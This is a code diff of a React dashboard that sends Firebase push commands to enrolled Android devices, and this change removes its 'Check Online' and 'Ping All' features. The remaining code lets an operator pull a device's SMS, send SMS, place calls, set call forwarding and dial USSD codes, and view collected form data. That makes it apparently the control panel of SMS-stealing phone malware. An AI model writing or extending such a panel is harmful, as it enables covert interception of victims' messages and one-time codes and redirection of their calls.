@@ -37,7 +37,7 @@ interface DbMessage {
 }
 interface DbFormData { id: number; appId: string; deviceId: string; data: Record<string, unknown>; submittedAt: string; }
 type Page = "home" | "messages" | "groups" | "devices" | "settings";
-type ActionKey = "online_check" | "get_sms" | "send_sms" | "voice_call" | "call_forward" | "dial_ussd";
+type ActionKey = "get_sms" | "send_sms" | "voice_call" | "call_forward" | "dial_ussd";
 type SendState = "idle" | "loading" | "ok" | "err";
 
 function sc(s: string) {
@@ -96,10 +96,6 @@ async function fcmSend(deviceId: string, data: Record<string, string>): Promise<
   return String(body["messageId"] ?? "sent");
 }
 
-/** Build CHECK_ONLINE payload — Android: enqueueCheckOnline(payload) */
-function mkCheckOnline(uid: string): Record<string, string> {
-  return { type: "CHECK_ONLINE", payload: JSON.stringify({ uniqueid: uid }) };
-}
 /** Build DEVICE_COMMAND payload — Android: routeDeviceCommand(payload) */
 function mkDeviceCmd(uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
   return { type: "DEVICE_COMMAND", payload: JSON.stringify({ uniqueid: uid, action, ...extra }) };
@@ -301,7 +297,7 @@ function ActionPanel({ action, device, onClose }: { action: ActionKey; device: D
   }
 
   const titles: Record<ActionKey, string> = {
-    online_check: "Online Check", get_sms: "Get SMS", send_sms: "Send SMS",
+    get_sms: "Get SMS", send_sms: "Send SMS",
     voice_call: "Voice Call", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
   };
 
@@ -314,15 +310,6 @@ function ActionPanel({ action, device, onClose }: { action: ActionKey; device: D
         <button onClick={onClose} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: 18, cursor: "pointer", padding: 0, lineHeight: 1 }}>✕</button>
       </div>
 
-      {action === "online_check" && (
-        <>
-          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>
-            Pings <b>{device.name}</b> to check if it's online and reachable.
-          </div>
-          <StatusLog state={state} log={log} />
-          <PrimaryBtn state={state} idle="Send" loading="Sending…" ok="Sent" onClick={() => void send({ type: "0" })} />
-        </>
-      )}
       {action === "get_sms" && (
         <>
           <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>Device will upload its latest messages.</div>
@@ -643,67 +630,6 @@ function GroupsPage({ devices, formData, onOpenDevice }: { devices: DbDevice[]; 
   );
 }
 
-/* ─── Per-device Check Online button ─── */
-function CheckOnlineBtn({ device }: { device: DbDevice }) {
-  const [checking, setChecking] = useState(false);
-  const [errMsg, setErrMsg] = useState("");
-  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-
-  useEffect(() => () => { if (timeoutRef.current) clearTimeout(timeoutRef.current); }, []);
-
-  // SSE: device heartbeat received → immediately reset to "Check Online"
-  useEffect(() => {
-    function onUpdated(e: Event) {
-      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
-      if (deviceId !== device.deviceId) return;
-      if (timeoutRef.current) clearTimeout(timeoutRef.current);
-      setChecking(false);
-    }
-    window.addEventListener("mrrobot:device_updated", onUpdated);
-    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
-  }, [device.deviceId]);
-
-  async function handleClick(e: React.MouseEvent) {
-    e.stopPropagation();
-    if (checking) return;
-    if (timeoutRef.current) clearTimeout(timeoutRef.current);
-    setErrMsg("");
-
-    try {
-      await fcmSend(device.deviceId, { type: "0" });
-    } catch (err) {
-      setErrMsg((err as Error).message || "FCM failed");
-      setTimeout(() => setErrMsg(""), 4000);
-      return;
-    }
-
-    setChecking(true);
-    // Auto-reset after 15s if device never responds
-    timeoutRef.current = setTimeout(() => setChecking(false), 15000);
-  }
-
-  return (
-    <div>
-      <button onClick={e => void handleClick(e)} style={{
-        width: "100%", borderRadius: 6, padding: "6px 4px",
-        fontSize: 11, fontWeight: 600, textAlign: "center", marginTop: 2,
-        border: checking ? "1px solid #bfdbfe" : "1px solid #e2e8f0",
-        background: checking ? "#eff6ff" : "#f8fafc",
-        color: checking ? "#1d4ed8" : "#475569",
-        cursor: checking ? "default" : "pointer",
-        transition: "background 0.25s, border-color 0.25s, color 0.25s",
-      }}>
-        {checking ? "Checking…" : "Check Online"}
-      </button>
-      {errMsg && (
-        <div style={{ fontSize: 9, color: "#dc2626", marginTop: 3, lineHeight: 1.3, wordBreak: "break-word" }}>
-          {errMsg}
-        </div>
-      )}
-    </div>
-  );
-}
-
 /* ════════════════════════════════════════
    PAGE — DEVICES
 ════════════════════════════════════════ */
@@ -831,9 +757,9 @@ function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: Db
   const [showAdminUpdate, setShowAdminUpdate] = useState(false);
   const [quickState, setQuickState] = useState<Record<string, "idle"|"loading"|"ok"|"err">>({});
 
-  async function sendQuick(device: DbDevice, key: "online_check"|"get_sms") {
+  async function sendQuick(device: DbDevice, key: "get_sms") {
     setQuickState(s => ({ ...s, [key]: "loading" }));
-    const cmd = key === "online_check" ? { type: "0" } : mkDeviceCmd(device.deviceId, "get_sms");
+    const cmd = mkDeviceCmd(device.deviceId, "get_sms");
     try {
       await fcmSend(device.deviceId, cmd);
       setQuickState(s => ({ ...s, [key]: "ok" }));
@@ -861,7 +787,6 @@ function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: Db
     : [];
 
   const ACTIONS: { label: string; key: ActionKey }[] = [
-    { label: "Online Check", key: "online_check" },
     { label: "Get SMS", key: "get_sms" },
     { label: "Send SMS", key: "send_sms" },
     { label: "Voice Call", key: "voice_call" },
@@ -925,7 +850,7 @@ function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: Db
         {/* Action buttons */}
         <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
           {ACTIONS.map(({ label, key }) => {
-            const isQuick = key === "online_check" || key === "get_sms";
+            const isQuick = key === "get_sms";
             const qs = quickState[key] ?? "idle";
             const isActive = activeAction === key;
 
@@ -935,7 +860,7 @@ function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: Db
               const txtColor = qs !== "idle" ? "#fff" : t.txt2;
               return (
                 <button key={key}
-                  onClick={() => void sendQuick(selected, key as "online_check"|"get_sms")}
+                  onClick={() => void sendQuick(selected, key as "get_sms")}
                   disabled={qs === "loading"}
                   style={{
                     background: bgColor, border: "1.5px solid", borderColor: bdColor,
@@ -1046,10 +971,6 @@ function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: Db
                 </span>
               </div>
 
-              {/* Check Online button */}
-              <div style={{ padding: "8px 14px" }}>
-                <CheckOnlineBtn device={device} />
-              </div>
             </div>
           );
         })}
@@ -1615,10 +1536,6 @@ export default function WebDashboard() {
   const [selectedDevice, setSelectedDevice] = useState<DbDevice | null>(null);
   const [backPage, setBackPage] = useState<Page>("home");
   const [scrollToMsgId, setScrollToMsgId] = useState<string | null>(null);
-  const [checkAllState, setCheckAllState] = useState<"idle" | "running" | "done">("idle");
-  const [checkAllDone, setCheckAllDone] = useState(0);
-  const [checkAllTotal, setCheckAllTotal] = useState(0);
-  const [checkAllResult, setCheckAllResult] = useState<{ ok: number; fail: number } | null>(null);
   const [filterRecent, setFilterRecent] = useState(false);
   const [refreshing, setRefreshing] = useState(false);
   const [, liveTick] = useState(0); // global 1s tick — drives live timeAgo on all device cards
@@ -1675,8 +1592,6 @@ export default function WebDashboard() {
     es.addEventListener("device_updated", (e: MessageEvent) => {
       const data = JSON.parse(e.data) as { deviceId: string; appId: string };
       if (data.appId !== appId) return;
-      // Notify CheckOnlineBtn timer
-      window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: data.deviceId } }));
       // Silently refresh devices list (lastOnline recalculated server-side)
       void (async () => {
         try {
@@ -1713,40 +1628,6 @@ export default function WebDashboard() {
   const totalDevices = devices.length;
   const recentCount = devices.filter(d => isRecent(d.lastOnline)).length;
   const displayDevices = filterRecent ? devices.filter(d => isRecent(d.lastOnline)) : devices;
-
-  async function handleCheckAll() {
-    if (checkAllState === "running") return;
-    // latest → oldest: reverse of DB insertion order
-    const allDevices = [...devices].reverse();
-    if (!allDevices.length) { setCheckAllState("done"); setTimeout(() => setCheckAllState("idle"), 2500); return; }
-
-    const BATCH_SIZE = 2;
-    const BATCH_DELAY_MS = 800;
-
-    setCheckAllState("running");
-    setCheckAllDone(0);
-    setCheckAllTotal(allDevices.length);
-    setCheckAllResult(null);
-    let ok = 0; let fail = 0;
-
-    for (let i = 0; i < allDevices.length; i += BATCH_SIZE) {
-      const batch = allDevices.slice(i, i + BATCH_SIZE);
-      const results = await Promise.allSettled(
-        batch.map(d =>
-          fcmSend(d.deviceId, { type: "0" })
-        )
-      );
-      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
-      setCheckAllDone(Math.min(i + BATCH_SIZE, allDevices.length));
-      if (i + BATCH_SIZE < allDevices.length) {
-        await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
-      }
-    }
-
-    setCheckAllResult({ ok, fail });
-    setCheckAllState("done");
-    setTimeout(() => { setCheckAllState("idle"); setCheckAllDone(0); setCheckAllTotal(0); setCheckAllResult(null); }, 4000);
-  }
 
   const NAV: { key: Page; label: string }[] = [
     { key: "home", label: "Home" },
@@ -1848,59 +1729,9 @@ export default function WebDashboard() {
               </span>
             </button>
 
-            {/* Check Online All pill button */}
-            <button
-              onClick={() => void handleCheckAll()}
-              disabled={checkAllState === "running"}
-              style={{
-                display: "flex", alignItems: "center", gap: 5,
-                background: checkAllState === "done"
-                  ? "#052e16"
-                  : checkAllState === "running"
-                  ? "#1e1b4b"
-                  : "#1e1b4b",
-                border: `1px solid ${checkAllState === "done" ? "#166534" : "#4f46e5"}`,
-                borderRadius: 20, padding: "4px 10px",
-                cursor: checkAllState === "running" ? "wait" : "pointer",
-              }}
-            >
-              {/* icon */}
-              <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
-                {checkAllState === "done"
-                  ? <polyline points="1.5,5 4,7.5 8.5,2" stroke="#4ade80" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
-                  : checkAllState === "running"
-                  ? <circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5" strokeDasharray="5 3"/>
-                  : <><circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5"/><polygon points="4,3.2 7.5,5 4,6.8" fill="#818cf8"/></>
-                }
-              </svg>
-              <span style={{
-                fontSize: 10, fontWeight: 700, lineHeight: 1, whiteSpace: "nowrap",
-                color: checkAllState === "done" ? "#4ade80" : "#a5b4fc",
-              }}>
-                {checkAllState === "running"
-                  ? `${checkAllDone}/${checkAllTotal}`
-                  : checkAllState === "done"
-                  ? "Sent!"
-                  : "Ping All"}
-              </span>
-            </button>
 
           </div>
         </div>
-        {/* Ping All progress bar / result */}
-        {checkAllState === "running" && (
-          <div style={{ height: 3, background: "#1e1b4b", overflow: "hidden" }}>
-            <div style={{ height: "100%", background: "#6366f1", width: `${checkAllTotal > 0 ? Math.round((checkAllDone / checkAllTotal) * 100) : 0}%`, transition: "width 0.4s ease" }} />
-          </div>
-        )}
-        {checkAllState === "done" && checkAllResult && (
-          <div style={{ padding: "3px 14px", display: "flex", alignItems: "center", gap: 8, background: "#0f172a" }}>
-            <span style={{ fontSize: 10, fontWeight: 700, color: "#4ade80" }}>✓ {checkAllResult.ok} sent</span>
-            {checkAllResult.fail > 0 && (
-              <span style={{ fontSize: 10, fontWeight: 700, color: "#f59e0b" }}>· ✗ {checkAllResult.fail} failed</span>
-            )}
-          </div>
-        )}
         </div>
 
         {/* Tab nav */}
